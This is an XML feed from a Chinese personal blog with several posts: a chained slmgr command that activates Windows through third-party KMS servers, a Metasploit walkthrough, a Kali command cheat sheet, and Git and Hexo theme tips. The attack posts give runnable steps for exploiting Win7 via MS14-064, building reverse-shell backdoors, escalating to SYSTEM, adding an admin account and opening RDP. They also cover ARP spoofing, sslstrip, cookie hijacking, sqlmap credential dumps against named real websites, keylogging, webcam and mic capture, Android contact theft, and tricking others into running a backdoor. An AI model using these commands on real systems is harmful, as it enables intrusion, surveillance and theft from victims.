        <content type="html"><![CDATA[<h2 id="开始激活"><a href="#开始激活" class="headerlink" title="开始激活"></a>开始激活</h2><p>以管理员身份运行命令提示符然后复制以下内容到终端回车重启电脑即可激活.</p><pre class="line-numbers language-cmd"><code class="language-cmd">slmgr /skms kms.v0v.bid & slmgr /atoslmgr /skms k01.v0v.bid && slmgr /atoslmgr /skms k02.v0v.bid && slmgr /atoslmgr /skms k03.v0v.bid && slmgr /atoslmgr /skms k04.v0v.bid && slmgr /atoslmgr /skms k05.v0v.bid && slmgr /atoslmgr /skms k06.v0v.bid && slmgr /atoslmgr /skms k07.v0v.bid && slmgr /atoslmgr /skms k08.v0v.bid && slmgr /atoslmgr /skms k09.v0v.bid && slmgr /atoslmgr /skms k10.v0v.bid && slmgr /atoslmgr /skms k11.v0v.bid && slmgr /atoslmgr /skms k12.v0v.bid && slmgr /atoslmgr /skms k13.v0v.bid && slmgr /atoslmgr /skms kms.ghpym.com && slmgr /atoslmgr /skms kms.qkeke.com && slmgr /ato<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 资源分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MS14-064 漏洞测试入侵Win7</title>
      <link href="/2021/01/21/21/"/>
      <url>/2021/01/21/21/</url>
      
        <content type="html"><![CDATA[<h2 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h2><p>Microsoft Windows OLE远程代码执行漏洞，OLE（对象链接与嵌入）是一种允许应用程序共享数据和功能的技术.</p><p>远程攻击者利用此漏洞通过构造的网站执行任意代码，影响Win95+IE3 – Win10+IE11全版本.</p><p>metasploit里已经加入了此漏洞的利用模块 ：exploit/windows/browser/ms14_064_ole_code_execution</p><p><strong>执行命令：</strong></p><pre class="line-numbers language-msf"><code class="language-msf">msfconsole    //启动MSFsearch ms14   //搜索关键字use exploit/windows/browser/ms14_064_ole_code_execution  // 加载漏洞利用模块set payload windows/meterpreter/reverse_tcp    //设置反弹连接shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>如图：</strong> </p><p><img src="https://img.imgdb.cn/item/60094acf3ffa7d37b3661af5.png" alt=""></p><p>需要注意的是箭头标记的属性默认为false 需要设置为true ，因为msf中自带的漏洞利用exp调用的是 powershell.</p><p>所以msf（Metasploit Framework）中的exp代码只对安装powershell的系统生效。win7系统安装自带powershell,所以这里测试受害的机器为windows7 32位.</p><p>按照图中各个属性配置好后 执行:</p><pre class="line-numbers language-msf"><code class="language-msf">exploit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可 .</p><p><img src="https://img.imgdb.cn/item/60094b533ffa7d37b3665611.png" alt=""></p><p>到一个URL地址，复制到受害者机器(win7)测试</p><p>当用户点击允许了后,可以看见这边反弹了一个shell， 测试成功。</p><h2 id="用MSF进行提权"><a href="#用MSF进行提权" class="headerlink" title="用MSF进行提权"></a>用MSF进行提权</h2><p>在WEB渗透中拿到webshell了，我们可以试试用MSF(metasploit)来进行提权，在MSF里meterpreter很强大的！先用msfvenom生成一个EXE的木马后门:</p><pre class="line-numbers language-msf"><code class="language-msf">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\x00' LHOST=192.168.1.7 LPORT=4444 -f exe > abc.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img.imgdb.cn/item/60094c2b3ffa7d37b366c4c4.png" alt=""></p><p>然后在到MSF根据刚才配置的木马后门进行监听，然后在把木马上传到服务器（受害者）的机器里，必须上传到可读可写的目录下.</p><p><img src="https://img.imgdb.cn/item/60094c753ffa7d37b366f0f6.png" alt=""></p><p>这里我把abc.exe上传到了C:\users\leak\desktop\目录下，abc.exe就是刚才生成的后门.</p><p><img src="https://img.imgdb.cn/item/60094cb03ffa7d37b3670cc0.png" alt=""></p><p>然后在执行的后门，可以看见MSF弹回了一个session 1(会话连接).说明后门程序成功执行起来了，当然你也可以在webshell执行的，但必须的有一点执行的权限.</p><p><img src="https://img.imgdb.cn/item/60094d623ffa7d37b36766ba.png" alt=""></p><p>getuid //可以看见权限很低，一般都是user权限的，但也遇到过某些服务器执行后就直接是system最高权限.像这种就直接加用户.</p><p>这里是user权限，我们要把它提升到system权限,Windows最高权限。</p><p><img src="https://img.imgdb.cn/item/60094dae3ffa7d37b3678dcc.png" alt=""></p><p> 接着输入命令 :</p><pre class="line-numbers language-msf"><code class="language-msf">background     //把你当前的metasploit shell转为后台执行。search ms16  // 搜索关键字相关的漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 然后我选择了MS16-016这个漏洞在进行提权 :</p><pre class="line-numbers language-msf"><code class="language-msf">use exploit/windows/local/ms16_016_webdav //  选择漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img.imgdb.cn/item/60094e3b3ffa7d37b367df6b.png" alt=""></p><pre class="line-numbers language-msf"><code class="language-msf">show options  //查看漏洞里边要设置的参数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 可以看见只有一个SESSION参数要设置 ：</p><p><img src="https://img.imgdb.cn/item/60094e7b3ffa7d37b367fffa.png" alt=""></p><pre class="line-numbers language-msf"><code class="language-msf">set  SESSION 1 // 设置会刚才我们后门连接的ID号 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看见成功的吧漏洞利用到了PID为692的进程中,虽然提权成功了 但你getuid下还是看见的是user权限：</p><p><img src="https://img.imgdb.cn/item/60094ede3ffa7d37b368368a.png" alt=""></p><pre class="line-numbers language-linux"><code class="language-linux">ps一下查看进程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据刚才的提示找到PID 692的进程,可以看见确实是system权限.</p><p><img src="https://img.imgdb.cn/item/60094f273ffa7d37b3685fc7.png" alt=""></p><p> 所以还要用到migrate 命令 //迁移到一个指定的进程ID.</p><pre class="line-numbers language-msf"><code class="language-msf">migrate 692  //<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 在getuid下可以看见为system权限 .</p><p><img src="https://img.imgdb.cn/item/60094f983ffa7d37b368a19d.png" alt=""></p><p>既然有了system权限 那我们在添加账号hack,添加为管理员组</p><p><img src="https://img.imgdb.cn/item/600950b23ffa7d37b3695ade.png" alt=""></p><p> 用Nmap扫下并没有开启远程登陆3389 .</p><p><img src="https://img.imgdb.cn/item/600950e43ffa7d37b36980ef.png" alt=""></p><pre class="line-numbers language-msf"><code class="language-msf">run getgui -e  //开启目标主机3389 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 貌似这条MSF命令只对2003的系统有效 执行几次都没成功  , 所以就用cmd命令开了3389端口 .</p><p><img src="https://img.imgdb.cn/item/600951513ffa7d37b369cc98.png" alt=""></p><p> 提权成功，登录服务器 .</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali Linux常用命令</title>
      <link href="/2021/01/20/20/"/>
      <url>/2021/01/20/20/</url>
      
        <content type="html"><![CDATA[<p>端口扫描</p><pre><code>nmap -sS 目标ipArp 内网断网Arpspoof -i 网卡 -t 目标ip 网关获取网卡/网关ifconfig获取内网ipfping -asg 192.168.1.0/24Arp 欺骗echo 写命令，是不会有回显的ehco 1 &gt;proc/sys/net/ipv4/ip_forward</code></pre><p>进行IP流量转发</p><p>目标 –》 我的网卡 –》网关</p><pre><code>driftnet --&gt; 获取本机网卡的图片driftnet -i eth0 获取本机网卡的图片ifconfig #查看网络信息iwconfig #查看网卡信息kali中查找程序或命令ex:sqlmap find / -name sqlmapfind / -name ettercap</code></pre><p>HTTP 帐号密码获取</p><pre><code>Arpspoof --&gt; 欺骗Ettercap --&gt; 欺骗 DNS欺骗 流量 嗅探实战前的信息采集：目标机器： 目标ip，网关攻击机器： kali iparpspoof -i eth0 -t 目标ip 网关开启ip转发echo 1 &gt;/proc/sys/net/ipv4/ip_forwardcat 查看内容cat /proc/sys/net/ipv4/ip_forward启动ettercap进行流量嗅探ettercap -Tq -i eth0-Tq --&gt; -T: 启动文本模式，q:安静模式；-i --&gt; i: 网关；url解码：www.convertstring.com</code></pre><p>HTTPS 账户密码获取</p><pre><code>vim /etc/ettercap/etter.conf修改iptables规则去掉注释符号保存推出sslstrip --》 可以把HTTPS还原为httparpspoof -i eth0 -t 目标ip 网关开启ip转发echo 1 &gt;/proc/sys/net/ipv4/ip_forwardettercap -Tq -i eth0sslstrip -a -f -k缺点：容易出现证书错误！</code></pre><p>会话劫持<br>需要的工具</p><pre><code>Arpspoof ==&gt; Arp欺骗Wireshark ==&gt; 抓包ferret ==&gt; 重新生成抓包后的文件hamster ==&gt; 重放流量#trip1：基于arp欺骗arpspoofarpspoof -i eth0 -t 目标ip 网关 echo 1 &gt;/proc/sys/net/ipv4/ip_forwardstart Wireshark #开始抓包ferret -r cockie.pcap #生成hamster.txt#trip2：基于ferretferret -1 eth0hamster#trip3：基于CookieCadger.jar一键劫持install CookieCadger选择网卡动态截取流量</code></pre><p>SqlMap<br>asp 网站，大多用的Access 文件 数据库 MSSQL数据库<br>数据库表<br>字段(列)</p><pre><code>sqlmap -u http://www.baidu.com-u 检测是否存在注入成功，返回数据库信息sqlmap -u www.baidu.com --tables暴力猜解所有表名（有点慢）sqlmap -u http://www.baidu.com --columns -T &quot;user&quot;--columns 猜列名 根据user sqlmap -u &quot;http://www.baidu.com&quot; --dump -C &quot;username,password&quot; -T &quot;user&quot;--dump 下载数据 -C &quot;username,password&quot;列名php 网站， 大多用Mysqlsqlmap -u &quot;http://www.ggec.com.cn/oneNews.php?id=69&quot; --is-dbaback-end DBMS:MySQL &gt;= 5.0.0sqlmap -u &quot;http://www.ggec.com.cn/oneNews.php?id=69&quot; --dbs列出所有数据库sqlmap -u &quot;http://www.ggec.com.cn/oneNews.php?id=69&quot; --current-db</code></pre><p>查找自己的数据库</p><pre><code>sqlmap -u &quot;http://www.ggec.com.cn/oneNews.php?id=69&quot; --tables -D &quot;ggec&quot;猜解(查询)所有表名 根据 ggecsqlmap -u &quot;http://www.ggec.com.cn/oneNews.php?id=69&quot; --columns -T &quot;ggec_admin&quot; -D &quot;ggec&quot;查询 所有的列sqlmap -u &quot;http://www.ggec.com.cn/oneNews.php?id=69&quot; --dump -C &quot;username,password&quot; -T &quot;ggec_admin&quot; -D &quot;ggec&quot;查询列的字段www.cmd5.com md5在线加解密站点</code></pre><p>sqlmap cookie注入</p><pre><code>sqlmap -u &quot;http://www.wisefund.com.cn/about.asp&quot; --cookie &quot;id=56&quot; --level 2--cookie &quot;&quot; 这里写id的参数，如果是cookie注入，就要把等级提升为level 2sqlmap -u &quot;http://www.wisefund.com.cn/about.asp&quot; --tables --cookie &quot;id=56&quot; --level 2sqlmap -u &quot;http://www.wisefund.com.cn/about.asp&quot; --columns -T &quot;user&quot; --cookie &quot;id=56&quot; --level 2sqlmap -u &quot;http://www.wisefund.com.cn/about.asp&quot; --dump -C &quot;username,password&quot; -T &quot;user&quot; --cookie &quot;id=56&quot; --level 2</code></pre><p>Metasploit 基础<br>Exploit 模块 – 》 漏洞利用</p><pre><code>Payloads -- 》 shellCode use exploit/windows/smb/ms08_067_netapi选择漏洞利用模块show options查看要填入的参数set RHOST 192.168.1,100set PAYLOAD window/meterpreter/reverse_tcpRHOST --&gt; 目标IPLHOST --&gt; 本机IPexploit --》 执行操作 实施攻击成功则反馈msfconsole 从终端启动metasploitbackgroundsessions -i number </code></pre><p>木马 ：控制端 服务端<br>控制远程 木马程序<br>a.根据自己的IP生成一个马</p><pre><code>我的IP 192.168.1.103 55555msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=55555X&gt; test.exe这么下来，就会生成一个test.exe的木马程序b. use exploit/multi/handler使用handler这个模块set PAYLOAD windows/meterpreter/reverse_tcp使用这个shellcodeLHOST = 192.168.1.103LRORT = 55555这里填写 生成木马的IP和端口c. 先执行msf，再执行马木马的使用注入进程：木马随时有可能被结束掉的ps: 得到我们要注入的PID进程2036 2004 explorer.exe 桌面进程migrate 2036 #注入进程远程桌面的开启：Run vnc 开启远程桌面文件管理功能Downlaod 下载文件Edit 编辑文件Cat 查看文件mkdir 创建文件Mv 移动文件Rm 删除文件Upload 上传文件Rmdir 删除文件夹查看PHP文件：　cat hack.php下载文件： download hack.php删除文件： rm hack.php上传文件： upload hack.php网络及系统操作Arp 查看ARP缓冲表Ifconfig 查看IP地址网卡Getproxy 获取代理Netstat 查看端口链接kill 杀死进程ps    查看进程reboot 重启机器reg 修改注册表shell 获取shellshutdown 关机sysinfo 获取电脑信息用户操作和其他功能讲解enumdesktops    窗体    keyscan_dump    键盘记录 -- 下载keyscan_start    键盘记录 -- 开始keyscan_stop    键盘记录 -- 停止Uict1    获取键盘鼠标控uictl disable keyboard/mouse 禁用键盘/鼠标 uictl enable keyboard/mouse 启用键盘/鼠标制权record_mic    音频录制record_mic -d 10 后台录音10秒webcam_chat    查看摄像头接口webcam_list 查看摄像头列表webcam_stream    摄像头视频获取GetSystem 获取高权限Hashdump    下载hashMetasploit Androd实战笔记Msfpayload android/meterpreter/reverse_tcp LHOST=192.168.1.103 LPROT=55555 R &gt; test.apkSearch    搜索 jpg,png,bmpDownload    下载    jpg,png,bmpwebcam_snap    手机截屏 webcam_stream -i [1:2?] 手机摄像头监控check_root    检测Root    dump_calllog    下载电话记录dump_contacts 下载信息记录Geolocate 定位</code></pre><p>Metasploit服务器蓝屏攻击</p><pre><code>DDos服务器开启 3389确定目标： 192.168.1.103MS12 020auxiliary/dos/windows/rdp/ms12_020_maxchannelids服务器远程桌面的一个可用模块auxiliary/scanner/rdp/ms12_020_check扫描主机是否存在漏洞RHOST R开头，远程主机 auxiliary/dos/windows/rdp/ms12_020_maxchannelids目的：比DDos来的更直接一些Metasploit生成webshella.在msf中生成一个PHP脚本msfpayload php/meterpreter/reverse_tcp LHOST=192.168.1.101 R &gt; web.php生成一个PHP脚本　　cat 查看文件内容</code></pre><p>MSF———先在kali上制作一个后门程序。文件名为：openme.exe</p><p>命令：</p><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.128 LPORT=50000 -f exe -o openme.exe</p><p> #本地监听地址及端口号：10.10.10.128：50000  </p><p> 为生成的文件 openme.exe 赋予可执行的权限，如果有必要可以对该文件执行免杀</p><p>命令：</p><p>chmod 777 openme.exe </p><p> 打开msf，加载exploit/multi/handler模块，同时设置本地主机地址，本地端口</p><p>命令：</p><pre class="line-numbers language-msf"><code class="language-msf">msfconsole  msf > use exploit/multi/handlermsf exploit(handler) > set lhost 10.10.10.128msf exploit(handler) > set lport 50000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 开始执行渗透攻击并监听</p><p>命令：</p><pre class="line-numbers language-msf"><code class="language-msf">msf exploit(handler) > exploit -z -j<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 此时，你可以将文件发给其他人，利用社会工程学知识让别人在他的win7系统上打开该文件，那么你的目的就达到了</p><p>下面就是我在win7虚拟机中的文件，然后运行该文件</p><p> 后门程序反向连接到msf，msf发起第二次攻击（开始渗透），然后客户端（后门程序）连接到服务端（msf）。</p><p>如图你在你kali上会有一个session。你攻陷了别人的主机并拿到了shell，还有session信息。</p><p>命令：</p><pre class="line-numbers language-msf"><code class="language-msf">msf exploit(handler) > sessionsmsf exploit(handler) > sessions -i 1meterpreter > shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 最后恭喜你就这样hacked别人的win7系统，如果你进一步学习Windows系统下的命令行操作，你就可以随意控制别人的主机了。</p><p>下面附上meterpreter常用的命令</p><pre class="line-numbers language-msf"><code class="language-msf">getsystem        #会自动利用各种各样的系统漏洞来进行权限提升migrate          #进程id进程迁移 background       #把当前的会话设置为背景，需要的时候在启用getuid          #查看对方正在运行的用户ps   #列出所有的进程getpid      #返回运行meterpreter的id号sysinfo       #产看系统信息和体系结构shell    #切换到cmd的系统权限方式exit   #退出shell会话返回meterpreter或终止meterpreter getdesktop截取目标主机当前桌面会话窗口run webcam -p /var/www    #在/var/www目录监控目标主机的摄像头keylog_recorder   #使用migrate将会话迁移至explorer.exe的进程空间后记录键盘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Git文件上传问题</title>
      <link href="/2021/01/19/19/"/>
      <url>/2021/01/19/19/</url>
      
        <content type="html"><![CDATA[<p>Git文件上传不能超过100m，超过就会上传不了，但是如果把那个上传不了的文件删掉，重新上传发现还是不行。</p><h2 id="问题解决方法"><a href="#问题解决方法" class="headerlink" title="问题解决方法"></a>问题解决方法</h2><p>把你博客目录里的.deploy_git文件夹干掉重新上传即可解决问题。</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客主题安装以及优化（三）</title>
      <link href="/2021/01/18/18/"/>
      <url>/2021/01/18/18/</url>
      
        <content type="html"><![CDATA[<h2 id="在页脚加上-GitHub-badge"><a href="#在页脚加上-GitHub-badge" class="headerlink" title="在页脚加上 GitHub badge"></a>在页脚加上 GitHub badge</h2><p>在footer.ejs文件中添加以下内容（在适当的位置添加）：</p><pre class="line-numbers language-html"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>github-badge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#fff</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>license<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://hexo.io/<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>由 Hexo 强力驱动<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-subject<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Powered<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-value bg-blue<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Hexo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>github-badge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#fff</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>license<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://github.com/<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>静态网页托管于 GitHub Pages 和 Coding Pages 和 Gitee Pages<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-subject<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Hosted<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-value bg-brightgreen<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>GitHub &amp; Coding &amp; Gitee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>github-badge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#fff</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>license<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cloud.tencent.com/<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>腾讯云提供域名相关服务<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-subject<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>DNS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-value bg-blueviolet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Tencent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>github-badge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#fff</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>license<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.jsdelivr.com/<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jsDelivr 提供 CDN 加速服务<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-subject<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>CDN<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-value bg-orange<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>jsDelivr<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>github-badge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#fff</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>license<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://blinkfox.github.io/<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>站点使用 Matery主题<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-subject<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Theme<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-value bg-blue<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Matery<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>github-badge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#fff</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>license<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://creativecommons.org/licenses/by-nc-sa/4.0/<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token 